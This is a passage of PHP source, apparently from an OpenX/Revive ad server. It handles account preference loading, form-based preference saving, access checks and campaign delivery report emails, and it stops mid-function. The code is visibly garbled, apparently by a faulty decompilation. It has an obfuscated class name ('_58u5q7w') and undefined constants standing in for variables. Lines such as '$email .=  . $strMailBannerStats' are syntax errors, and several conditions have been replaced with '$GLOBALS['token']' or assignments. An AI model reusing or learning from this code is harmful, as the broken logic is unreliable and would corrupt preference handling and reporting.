						if ($doAffiliates->getRowCount() == 1) {
							$aOwningAgencyId = $doAffiliates->getAll(array('agencyid'), false, true);
							$owningAgencyId = $aOwningAgencyId[0];
						}
					}

				}


				if ($owningAgencyId == 0) {
					OA_Preferences::_unsetPreferences();
					return NULL;
				}

				$doAgency = OA_Dal::factoryDO('agency');
				$doAgency->agencyid = $owningAgencyId;
				$doAgency->find();

				if ($doAgency->getRowCount() == 1) {
					$aManagerAccountId = $doAgency->getAll(array('account_id'), false, true);
					$managerAccountId = $aManagerAccountId[0];
					$aManagerPreferenceValues = OA_Preferences::_getPreferenceValues($managerAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aManagerPreferenceValues, $loadExtraInfo);
				}

				if (!$parentOnly) {
					if (!is_numeric($accountId)) {
						$currentAccountId = OA_Permission::getAccountId();
					}
					else {
						$currentAccountId = $accountId;
					}

					if ($currentAccountId <= 0) {
						OA_Preferences::_unsetPreferences();
						return NULL;
					}

					$aCurrentPreferenceValues = OA_Preferences::_getPreferenceValues($currentAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aCurrentPreferenceValues, $loadExtraInfo);
				}

			}

		}

		$aPreferences['language'] = !empty($aConf['max']['language']) ? $aConf['max']['language'] : 'en';

		if ($userId = OA_Permission::getUserId()) {
			$doUser = OA_Dal::factoryDO('users');
			$doUser->get('user_id', $userId);

			if (!empty($doUser->language)) {
				$aPreferences['language'] = $doUser->language;
			}
		}
		if ($return) {
			return $aPreferences;
		}
		else {
			$GLOBALS['_MAX']['PREF'] = $aPreferences;
		}
	}

	public function loadPreferencesByNameAndAccount($accountId, $aPreferencesNames, $accountType, $useCache = true)
	{
		$aPrefs = OA_Preferences::cachePreferences($accountId, $aPreferencesNames);

		if (count($aPrefs) == count($aPreferencesNames)) {
			return $aPrefs;
		}

		$aPrefsIds = OA_Preferences::getCachedPreferencesIds($aPreferencesNames, $accountType);
		$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
		$doAccount_preference_assoc->account_id = $accountId;
		$doAccount_preference_assoc->whereInAdd('preference_id', $aPrefsIds);
		$doAccount_preference_assoc->find();
		$aPrefs = array();
		$prefsIdsFlip = array_flip($aPrefsIds);

		while ($doAccount_preference_assoc->fetch()) {
			$aPrefs[$prefsIdsFlip[$doAccount_preference_assoc->preference_id]] = $doAccount_preference_assoc->value;
		}

		OA_Preferences::cachePreferences($accountId, $aPrefs);
		return $aPrefs;
	}

	public function getCachedPreferencesIds($aPrefNames, $accountType)
	{
		static $aPrefIdsCache;
		$aPrefFound = array();
		$aPrefNotFound = array();

		foreach ($aPrefNames as $prefName) {
			if (isset($aPrefIdsCache[$accountType][$prefName])) {
				$aPrefFound[$prefName] = $aPrefIdsCache[$accountType][$prefName];
			}
			else {
				$aPrefNotFound[$prefName] = $prefName;
			}
		}

		if (!empty($aPrefNotFound)) {
			$aPrefs = OA_Preferences::getPreferenceIds($aPrefNotFound, $accountType);

			if (is_array($aPrefs)) {
				foreach ($aPrefs as $prefId) {
					$prefName = STRaPrefIdsCache;
					$aPrefIdsCache[$accountType][$prefName] = $prefId;
					$aPrefFound[$prefName] = $prefId;
				}
			}
		}

		return $aPrefFound;
	}

	public function getPreferenceIds($aPrefNames, $accountType)
	{
		$doPreferences = OA_Dal::factoryDO('preferences');
		$doPreferences->account_type = $accountType;
		$doPreferences->whereInAdd('preference_name', $aPrefNames);
		return $doPreferences->getAll(array('preference_id'), 'preference_name');
	}

	public function cachePreferences($accountId, $aPreferences, $readOnly = true, $cleanCache = false)
	{
		static $aCache = array();

		if ($cleanCache) {
			$aCache = array();
			return $aCache;
		}
		if ($readOnly) {
			$prefsFound = array();

			foreach ($aPreferences as $prefName) {
				if (isset($aCache[$accountId][$prefName])) {
					$prefsFound[$prefName] = $aCache[$accountId][$prefName];
				}
			}

			return $prefsFound;
		}
		else {
			foreach ($aPreferences as $prefValue) {
				$prefName = STRaCache;
				$aCache[$accountId][$prefName] = $prefValue;
			}

			return $aPreferences;
		}
	}

	public function loadAdminAccountPreferences($return = false)
	{
		if ($return) {
			$aPrefs = OA_Preferences::loadPreferences(false, true, false, true);
			return $aPrefs;
		}
		else {
			OA_Preferences::loadPreferences(false, false, false, true);
		}
	}

	public function loadAccountPreferences($accountId, $return = false)
	{
		if ($return) {
			$aPrefs = OA_Preferences::loadPreferences(false, true, false, false, $accountId);
			return $aPrefs;
		}
		else {
			OA_Preferences::loadPreferences(false, false, false, false, $accountId);
		}
	}

	public function processPreferencesFromForm($aElementNames, $aCheckboxes)
	{
		phpAds_registerGlobalUnslashed('token');

		if (!phpAds_SessionValidateToken($GLOBALS['token'])) {
			return false;
		}

		$aPreferenceTypes = array();
		$doPreferences = OA_Dal::factoryDO('preferences');
		$doPreferences->find();

		if ($doPreferences->getRowCount() < 1) {
			return false;
		}

		while ($doPreferences->fetch()) {
			$aPreference = $doPreferences->toArray();
			$aPreferenceTypes[$aPreference['preference_name']] = array('preference_id' => $aPreference['preference_id'], 'account_type' => $aPreference['account_type']);
		}

		if (empty($aPreferenceTypes)) {
			return false;
		}

		$currentAccountType = OA_Permission::getAccountType();
		$currentAccountId = OA_Permission::getAccountId();
		$aParentPreferences = OA_Preferences::loadPreferences(false, true, true);
		$aSavePreferences = array();
		$aDeletePreferences = array();

		foreach ($aElementNames as $preferenceName) {
			$access = OA_Preferences::hasAccess($currentAccountType, $aPreferenceTypes[$preferenceName]['account_type']);

			if ($access == false) {
				continue;
			}

			phpAds_registerGlobalUnslashed($preferenceName);
			if (isset($aCheckboxes[$preferenceName]) && ($GLOBALS['token'])) {
				$GLOBALS[$preferenceName] = '';
			}
			else {
				if (isset($aCheckboxes[$preferenceName]) && ($GLOBALS['token'])) {
					$GLOBALS[$preferenceName] = '1';
				}

			}


			if (isset($GLOBALS[$preferenceName])) {
				if (!isset($aParentPreferences[$preferenceName]) || ($GLOBALS['token'])) {
					$aSavePreferences[$preferenceName] = $GLOBALS[$preferenceName];
				}
				else if ($currentAccountType != OA_ACCOUNT_ADMIN) {
					$aDeletePreferences[$preferenceName] = $GLOBALS[$preferenceName];
				}
			}
		}

		foreach ($aSavePreferences as $preferenceValue) {
			$preferenceName = ($GLOBALS['token']);
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->account_id = $currentAccountId;
			$doAccount_preference_assoc->preference_id = $aPreferenceTypes[$preferenceName]['preference_id'];
			$doAccount_preference_assoc->find();

			if ($doAccount_preference_assoc->getRowCount() != 1) {
				$doAccount_preference_assoc->value = $preferenceValue;
				$result = $doAccount_preference_assoc->insert();

				if ($result === false) {
					return false;
				}
			}
			else {
				$doAccount_preference_assoc->fetch();
				$doAccount_preference_assoc->value = $preferenceValue;
				$result = $doAccount_preference_assoc->update();

				if ($result === false) {
					return false;
				}

			}

		}

		foreach ($aDeletePreferences as $preferenceValue) {
			$preferenceName = ($GLOBALS['token']);
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->account_id = $currentAccountId;
			$doAccount_preference_assoc->preference_id = $aPreferenceTypes[$preferenceName]['preference_id'];
			$doAccount_preference_assoc->find();

			if ($doAccount_preference_assoc->getRowCount() == 1) {
				$result = $doAccount_preference_assoc->delete();

				if ($result === false) {
					return false;
				}
			}
		}

		return true;
	}

	public function hasAccess($currentAccount, $preferenceLevel)
	{
		if (is_null($preferenceLevel) || is_null($preferenceLevel)) {
			return true;
		}

		if ($currentAccount == OA_ACCOUNT_ADMIN) {
			return true;
		}

		if ($currentAccount == OA_ACCOUNT_MANAGER) {
			if ($preferenceLevel == OA_ACCOUNT_ADMIN) {
				return false;
			}

			return true;
		}

		if (($currentAccount == OA_ACCOUNT_ADVERTISER) && is_null($preferenceLevel)) {
			return true;
		}

		if (($currentAccount == OA_ACCOUNT_TRAFFICKER) && is_null($preferenceLevel)) {
			return true;
		}

		return false;
	}

	public function disableStatisticsColumns($aColumns)
	{
		$currentAccountType = OA_Permission::getAccountType();

		if ($currentAccountType != OA_ACCOUNT_ADMIN) {
			return NULL;
		}

		foreach ($aColumns as $preference) {
			$doPreferences = OA_Dal::factoryDO('preferences');
			$doPreferences->preference_name = $preference;
			$doPreferences->find();

			if ($doPreferences->getRowCount() != 1) {
				continue;
			}

			$doPreferences->fetch();
			$aColumnPreference = $doPreferences->toArray();
			$columnPreferenceId = $aColumnPreference['preference_id'];
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->preference_id = $columnPreferenceId;
			$doAccount_preference_assoc->find();

			while ($doAccount_preference_assoc->fetch()) {
				$doAccount_preference_assoc->value = 0;
				$doAccount_preference_assoc->update();
			}
		}
	}

	public function _unsetPreferences()
	{
		unset($GLOBALS['_MAX']['PREF']);
	}

	public function _getPreferenceValues($accountId)
	{
		$doAccount_Preference_Assoc = OA_Dal::factoryDO('account_preference_assoc');
		$doAccount_Preference_Assoc->account_id = $accountId;
		$aPreferenceValues = $doAccount_Preference_Assoc->getAll();
		return $aPreferenceValues;
	}

	public function _setPreferences(&$aPreferences, $aPreferenceTypes, $aPreferenceValues, $loadExtraInfo)
	{
		foreach ($aPreferenceValues as $aPreferenceValue) {
			if (isset($aPreferenceTypes[$aPreferenceValue['preference_id']])) {
				if (!$loadExtraInfo) {
					$aPreferences[$aPreferenceTypes[$aPreferenceValue['preference_id']]['preference_name']] = $aPreferenceValue['value'];
				}
				else {
					$aPreferences[$aPreferenceTypes[$aPreferenceValue['preference_id']]['preference_name']] = array('account_type' => $aPreferenceTypes[$aPreferenceValue['preference_id']]['account_type'], 'value' => $aPreferenceValue['value']);
				}
			}
		}

		if ($loadExtraInfo) {
			foreach ($aPreferenceTypes as $aPreferenceType) {
				if (!isset($aPreferences[$aPreferenceType['preference_name']])) {
					$aPreferences[$aPreferenceType['preference_name']]['account_type'] = $aPreferenceType['account_type'];
				}
			}
		}
	}

	public function getPreferenceDefaults()
	{
		$aPrefs = array(
			'default_banner_image_url'               => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => ''),
			'default_banner_destination_url'         => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => ''),
			'default_banner_weight'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'default_campaign_weight'                => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'warn_email_admin'                       => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => true),
			'warn_email_admin_impression_limit'      => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => 100),
			'warn_email_admin_day_limit'             => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => 1),
			'campaign_ecpm_enabled'                  => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false),
			'contract_ecpm_enabled'                  => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false),
			'warn_email_manager'                     => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => true),
			'warn_email_manager_impression_limit'    => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 100),
			'warn_email_manager_day_limit'           => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 1),
			'warn_email_advertiser'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'warn_email_advertiser_impression_limit' => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 100),
			'warn_email_advertiser_day_limit'        => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'timezone'                               => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => ''),
			'tracker_default_status'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => MAX_CONNECTION_STATUS_APPROVED),
			'tracker_default_type'                   => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => MAX_CONNECTION_TYPE_SALE),
			'tracker_link_campaigns'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_campaign_info'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_show_banner_info'                    => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_show_campaign_preview'               => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_banner_html'                    => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_banner_preview'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_hide_inactive'                       => array('account_type' => NULL, 'default' => false),
			'ui_show_matching_banners'               => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => true),
			'ui_show_matching_banners_parents'       => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => false),
			'ui_show_entity_id'                      => array('account_type' => NULL, 'default' => false),
			'ui_novice_user'                         => array('account_type' => NULL, 'default' => true),
			'ui_week_start_day'                      => array('account_type' => NULL, 'default' => 1),
			'ui_percentage_decimals'                 => array('account_type' => NULL, 'default' => 2)
			);
		require_once MAX_PATH . '/lib/OA/Admin/Statistics/Fields/Delivery/Affiliates.php';
		require_once MAX_PATH . '/lib/OA/Admin/Statistics/Fields/Delivery/Default.php';
		$aStatisticsFieldsDelivery['affiliates'] = &new OA_StatisticsFieldsDelivery_Affiliates();
		$aStatisticsFieldsDelivery['default'] = &new OA_StatisticsFieldsDelivery_Default();

		foreach ($aStatisticsFieldsDelivery as $obj) {
			foreach (array_keys($obj->getVisibilitySettings()) as $prefName) {
				$aPrefs[$prefName] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false);
				$aPrefs[$prefName . '_label'] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => '');
				$aPrefs[$prefName . '_rank'] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 0);
			}
		}

		$aDefaultColumns = array('ui_column_impressions', 'ui_column_clicks', 'ui_column_ctr', 'ui_column_revenue', 'ui_column_ecpm');
		$rank = 1;

		foreach ($aDefaultColumns as $prefName) {
			if (isset($aPrefs[$prefName])) {
				$aPrefs[$prefName]['default'] = true;
				$aPrefs[$prefName . '_rank']['default'] = $rank++;
			}
		}

		return $aPrefs;
	}
}

class _58u5q7w
{
	public $aAdminCache;
	public $aClientCache;
	public $aAgencyCache;

	public function sendCampaignDeliveryEmail($aAdvertiser, $oStartDate = NULL, $oEndDate = NULL, $campaignId = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$aAdvertiserPrefs = OA_Preferences::loadAccountPreferences($aAdvertiser['account_id'], true);
		$oTimezone = new Date_Timezone($aAdvertiserPrefs['timezone']);
		$this->convertStartEndDate($oStartDate, $oEndDate, $oTimezone);
		$aLinkedUsers = $this->getUsersLinkedToAccount('clients', $aAdvertiser['clientid']);
		$aLinkedUsers = $this->_addAdvertiser($aAdvertiser, $aLinkedUsers);
		$copiesSent = 0;
		if (!empty($aLinkedUsers) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($aConf['email']['useManagerDetails']) {
				$aFromDetails = $this->_getAgencyFromDetails($aAdvertiser['agencyid']);
			}

			foreach ($aLinkedUsers as $aUser) {
				$aEmail = $this->prepareCampaignDeliveryEmail($aUser, $aAdvertiser['clientid'], $oStartDate, $oEndDate, $campaignId);

				if ($aEmail !== false) {
					if (!isset($aEmail['hasAdviews']) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
						if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
							$copiesSent++;

							if ($aConf['email']['logOutgoing']) {
								phpAds_userlogSetUser(phpAds_userMaintenance);
								phpAds_userlogAdd(phpAds_actionAdvertiserReportMailed, $aAdvertiser['clientid'], $aEmail['subject'] . "\n\n\n" . '                                     ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                     ' . $aEmail['contents']);
							}
						}
					}
				}
			}
		}
		if ($copiesSent) {
			OA::debug('   - Updating the date the report was last sent for advertiser ID ' . $aAdvertiser['clientid'] . '.', PEAR_LOG_DEBUG);
			$doUpdateClients = OA_Dal::factoryDO('clients');
			$doUpdateClients->clientid = $aAdvertiser['clientid'];
			$doUpdateClients->reportlastdate = OA::getNow();
			$doUpdateClients->update();
		}

		return $copiesSent;
	}

	public function prepareCampaignDeliveryEmail($aUser, $advertiserId, $oStartDate, $oEndDate, $campaignId = NULL)
	{
		Language_Loader::load('default', $aUser['language']);
		OA::debug('   - Preparing "campaign delivery" report for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
		global $strMailHeader;
		global $strSirMadam;
		global $strMailBannerStats;
		global $strMailReportPeriodAll;
		global $strMailReportPeriod;
		global $date_format;
		global $strMailSubject;
		$aResult = array('subject' => '', 'contents' => '', 'hasAdviews' => false);
		$aAdvertiser = $this->_loadAdvertiser($advertiserId);

		if ($aAdvertiser === false) {
			return false;
		}

		if ($aAdvertiser['report'] != 't') {
			OA::debug('   - Reports disabled for advertiser ID ' . $advertiserId . '.', PEAR_LOG_ERR);
			return false;
		}

		if (empty($aUser['email_address'])) {
			OA::debug('   - No email for User ID ' . $aUser['user_id'] . '.', PEAR_LOG_ERR);
			return false;
		}

		$aEmailBody = $this->_prepareCampaignDeliveryEmailBody($advertiserId, $oStartDate, $oEndDate, $campaignId);

		if ($aEmailBody['body'] == '') {
			OA::debug('   - No campaigns with delivery for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
			return false;
		}

		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);
		$email .=  . $strMailBannerStats . "\n";
		$email = str_replace('{clientname}', $aAdvertiser['clientname'], $email);

		if (is_null($oStartDate)) {
			$email .=  . $strMailReportPeriodAll . "\n\n";
		}
		else {
			$email .=  . $strMailReportPeriod . "\n\n";
		}

		$email = str_replace('{startdate}', is_null($oStartDate) ? '' : $oStartDate->format($date_format), $email);
		$email = str_replace('{enddate}', $oEndDate->format($date_format), $email);
		$email .=  . $aEmailBody['body'] . "\n";
		$email .= $this->_prepareRegards($aAdvertiser['agencyid']);
		$aResult['subject'] = $strMailSubject . ': ' . $aAdvertiser['clientname'];
		$aResult['contents'] = $email;
		$aResult['hasAdviews'] = 0 < $aEmailBody['adviews'];
		return $aResult;
	}

	public function _prepareCampaignDeliveryEmailBody($advertiserId, $oStartDate, $oEndDate, $campaignId)
	{
		global $strCampaign;
		global $strBanner;
		$strCampaignLength = strlen($strCampaign);
		$strBannerLength = strlen($strBanner);
		$maxLength = max($strCampaignLength, $strBannerLength);
		$strCampaignPrint = '%-' . $maxLength . 's';
		$strBannerPrint = ' %-' . ($maxLength - 1) . 's';
		global $strImpressions;
		global $strClicks;
		global $strConversions;
		global $strTotal;
		global $strTotalThisPeriodLength;
		$strTotalImpressions = $strImpressions . ' (' . $strTotal . ')';
		$strTotalClicks = $strClicks . ' (' . $strTotal . ')';
		$strTotalConversions = $strConversions . ' (' . $strTotal . ')';
		$strTotalImpressionsLength = strlen($strTotalImpressions);
		$strTotalClicksLength = strlen($strTotalClicks);
		$strTotalConversionsLength = strlen($strTotalConversions);
		$strTotalThisPeriodLength = strlen($strTotalThisPeriod);
		$maxLength = max($strTotalImpressionsLength, $strTotalClicksLength, $strTotalConversionsLength, $strTotalThisPeriodLength);
		$adTextPrint = ' %' . $maxLength . 's';
		global $strLinkedTo;
		global $strNoStatsForCampaign;
		$emailBody = '';
		$totalAdviewsInPeriod = 0;
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->clientid = $advertiserId;

		if (!empty($campaignId)) {
			$doCampaigns->campaignid = $campaignId;
		}

		$doCampaigns->orderBy('campaignid');
		$doCampaigns->find();

		if (0 < $doCampaigns->getRowCount()) {
			while ($doCampaigns->fetch()) {
				$aCampaign = $doCampaigns->toArray();
				if (($aCampaign['status'] == '0') || $GLOBALS['strCampaign']) {
					$emailBody .= "\n" . sprintf($strCampaignPrint, $strCampaign) . ' ';
					$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
					$page = 'stats.php?clientid=' . $advertiserId . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
					$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
					$emailBody .= '=======================================================' . "\n\n";
					$doBanners = OA_Dal::factoryDO('banners');
					$doBanners->campaignid = $aCampaign['campaignid'];
					$doBanners->orderBy('bannerid');
					$doBanners->find();

					if (0 < $doBanners->getRowCount()) {
						$adsWithDelivery = false;

						while ($doBanners->fetch()) {
							$aAd = $doBanners->toArray();
							$adImpressions = phpAds_totalViews($aAd['bannerid']);
							$adClicks = phpAds_totalClicks($aAd['bannerid']);
							$adConversions = phpAds_totalConversions($aAd['bannerid']);
							if ((0 < $adImpressions) || $GLOBALS['strCampaign'] || $GLOBALS['strCampaign']) {
								$adsWithDelivery = true;
								$emailBody .= sprintf($strBannerPrint, $strBanner) . ' ';
								$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

								if (!empty($aAd['URL'])) {
									$emailBody .= $strLinkedTo . ': ' . $aAd['URL'] . "\n";
								}

								$emailBody .= ' ------------------------------------------------------' . "\n";
								$adHasStats = false;

								if (0 < $adImpressions) {
									$adHasStats = true;
									$emailBody .= sprintf($adTextPrint, $strTotalImpressions) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adImpressions)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'impressions', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								if (0 < $adClicks) {
									$adHasStats = true;
									$emailBody .= "\n" . sprintf($adTextPrint, $strTotalClicks) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adClicks)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'clicks', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								if (0 < $adConversions) {
									$adHasStats = true;
									$emailBody .= "\n" . sprintf($adTextPrint, $strTotalConversions) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adConversions)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'conversions', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								$emailBody .= "\n";
							}
						}
					}

					if ($adsWithDelivery != true) {
						$emailBody .= $strNoStatsForCampaign . "\n\n\n";
					}
				}
			}
		}

		return array('body' => $emailBody, 'adviews' => $totalAdviewsInPeriod);
	}

	public function _prepareCampaignDeliveryEmailBodyStats($adId, $oStartDate, $oEndDate, $type, $adTextPrint)
	{
		$oDbh = &OA_DB::singleton();
		global $date_format;
		global $strNoViewLoggedInInterval;
		global $strNoClickLoggedInInterval;
		global $strNoConversionLoggedInInterval;
		global $strTotalThisPeriod;

		if ($type == 'impressions') {
			$nothingLogged = $strNoViewLoggedInInterval;
		}
		else if ($type == 'clicks') {
			$nothingLogged = $strNoClickLoggedInInterval;
		}
		else if ($type == 'conversions') {
			$nothingLogged = $strNoConversionLoggedInInterval;
		}
		else {
			return array('body' => '', 'adviews' => 0);
		}

		$emailBodyStats = '';
		$total = 0;
		$doDataSummaryAdHourly = OA_Dal::factoryDO('data_summary_ad_hourly');
		$doDataSummaryAdHourly->selectAdd();
		$doDataSummaryAdHourly->selectAdd('date_time');
		$doDataSummaryAdHourly->selectAdd('SUM(' . $type . ') as quantity');
		$doDataSummaryAdHourly->ad_id = $adId;
		$doDataSummaryAdHourly->whereAdd('impressions > 0');

		if (!is_null($oStartDate)) {
			$oDate = new Date($oStartDate);
			$oDate->toUTC();
			$doDataSummaryAdHourly->whereAdd('date_time >= ' . $oDbh->quote($oDate->format('%Y-%m-%d %H:%M:%S'), 'timestamp'));
		}

		$oDate = new Date($oEndDate);
		$oDate->toUTC();
		$doDataSummaryAdHourly->whereAdd('date_time <= ' . $oDbh->quote($oDate->format('%Y-%m-%d %H:%M:%S'), 'timestamp'));
		$doDataSummaryAdHourly->groupBy('date_time');
		$doDataSummaryAdHourly->orderBy('date_time DESC');
		$doDataSummaryAdHourly->find();

		if (0 < $doDataSummaryAdHourly->getRowCount()) {
			$aAdQuantity = array();

			while ($doDataSummaryAdHourly->fetch()) {
				$v = $doDataSummaryAdHourly->toArray();
				$oDate = new Date($v['date_time']);
				$oDate->setTZbyID('UTC');
				$oDate->convertTZ($oEndDate->tz);
				$k = $oDate->format($date_format);

				if (!isset($aAdQuantity[$k])) {
					$aAdQuantity[$k] = 0;
				}

				$aAdQuantity += $k;
			}

			foreach ($aAdQuantity as $quantity) {
				$day = OA_DB::singleton();
				$emailBodyStats .= sprintf($adTextPrint, $day) . ': ';
				$emailBodyStats .= sprintf('%15s', phpAds_formatNumber($quantity)) . "\n";
				$total += $quantity;
			}

			$emailBodyStats .= sprintf($adTextPrint, $strTotalThisPeriod) . ': ';
			$emailBodyStats .= sprintf('%15s', phpAds_formatNumber($total)) . "\n";
		}
		else {
			$emailBodyStats .= '  ' . $nothingLogged . "\n";
		}

		return array('body' => $emailBodyStats, 'adviews' => $total);
	}

	public function sendCampaignImpendingExpiryEmail($oDate, $campaignId)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $date_format;
		$oPreference = new OA_Preferences();

		if (!isset($this->aAdminCache)) {
			$adminAccountId = OA_Dal_ApplicationVariables::get('admin_account_id');
			$adminPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_ADMIN);
			$aAdminPrefs = $oPreference->loadAccountPreferences($adminAccountId, $adminPrefsNames, OA_ACCOUNT_ADMIN);
			$aAdminUsers = $this->getAdminUsersLinkedToAccount();
			$this->aAdminCache = array($aAdminPrefs, $aAdminUsers);
		}
		else {
			list($aAdminPrefs, $aAdminUsers) = $this->aAdminCache;
		}

		$aPreviousOIDates = OX_OperationInterval::convertDateToPreviousOperationIntervalStartAndEndDates($oDate);
		$aPreviousOIDates = OX_OperationInterval::convertDateToPreviousOperationIntervalStartAndEndDates($aPreviousOIDates['start']);
		$doCampaigns = OA_Dal::staticGetDO('campaigns', $campaignId);

		if (!$doCampaigns) {
			return 0;
		}

		$aCampaign = $doCampaigns->toArray();

		if (!isset($this->aClientCache[$aCampaign['clientid']])) {
			$doClients = OA_Dal::staticGetDO('clients', $aCampaign['clientid']);
			$aLinkedUsers['advertiser'] = $this->getUsersLinkedToAccount('clients', $aCampaign['clientid']);
			$advertiserPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_ADVERTISER);
			$aPrefs['advertiser'] = $oPreference->loadAccountPreferences($doClients->account_id, $advertiserPrefsNames, OA_ACCOUNT_ADVERTISER);

			if (!isset($aAgencyCache[$doClients->agencyid])) {
				$doAgency = OA_Dal::staticGetDO('agency', $doClients->agencyid);
				$aLinkedUsers['manager'] = $this->getUsersLinkedToAccount('agency', $doClients->agencyid);
				$managerPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_MANAGER);
				$aPrefs['manager'] = $oPreference->loadAccountPreferences($doAgency->account_id, $managerPrefsNames, OA_ACCOUNT_MANAGER);
				$aAgencyFromDetails = $this->_getAgencyFromDetails($doAgency->agencyid);
				$this->aAgencyCache = array(
	$doClients->agencyid => array($aLinkedUsers['manager'], $aPrefs['manager'], $aAgencyFromDetails)
	);
			}
			else {
				$aAgencyFromDetails = $this->aAgencyCache[$doClients->agencyid][2];
				$aPrefs['manager'] = $this->aAgencyCache[$doClients->agencyid][2][1];
				$aLinkedUsers['manager'] = $this->aAgencyCache[$doClients->agencyid][2][1][0];
			}

			$aLinkedUsers['admin'] = $aAdminUsers;
			$aPrefs['admin'] = $aAdminPrefs;
			$aLinkedUsers['special']['advertiser'] = $doClients->toArray();
			$aLinkedUsers['special']['advertiser']['contact_name'] = $aLinkedUsers['special']['advertiser']['contact'];
			$aLinkedUsers['special']['advertiser']['email_address'] = $aLinkedUsers['special']['advertiser']['email'];
			$aLinkedUsers['special']['advertiser']['language'] = '';
			$aLinkedUsers['special']['advertiser']['user_id'] = 0;
			$aLinkedUsers = $this->_deleteDuplicatedUser($aLinkedUsers);
			$aPrefs['special'] = $aPrefs['admin'];
			$aPrefs['special']['warn_email_special'] = $aPrefs['special']['warn_email_advertiser'];
			$aPrefs['special']['warn_email_special_day_limit'] = $aPrefs['special']['warn_email_advertiser_day_limit'];
			$aPrefs['special']['warn_email_special_impression_limit'] = $aPrefs['special']['warn_email_advertiser_impression_limit'];
			$this->aClientCache = array(
	$aCampaign['clientid'] => array($aLinkedUsers, $aPrefs, $aAgencyFromDetails)
	);
		}
		else {
			$aAgencyFromDetails = $this->aClientCache[$aCampaign['clientid']][2];
			$this->aClientCache;
			$this->aClientCache;
		}

		$copiesSent = 0;

		foreach ($aLinkedUsers as $aUsers) {
			$accountType = ($aConf = $GLOBALS['_MAX']['CONF']);
			if (($accountType == 'special') || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$aFromDetails = $aAgencyFromDetails;
			}
			else {
				$aFromDetails = '';
			}

